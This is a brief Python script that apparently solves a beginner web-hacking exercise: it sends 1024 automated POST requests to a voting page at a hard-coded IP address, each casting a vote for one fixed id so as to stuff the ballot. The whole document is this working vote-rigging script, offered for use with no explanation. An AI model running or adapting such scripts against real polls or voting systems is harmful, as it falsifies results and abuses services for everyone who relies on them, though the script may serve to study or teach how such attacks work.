#!/usr/bin/python3
import requests


url = "http://158.69.76.135/level0.php"
id = 2835
repeat = 1024

for i in range(repeat):
    print("voting time {}".format(i))
    requests.post(url, data={"id": id, "holdthedoor": 1})
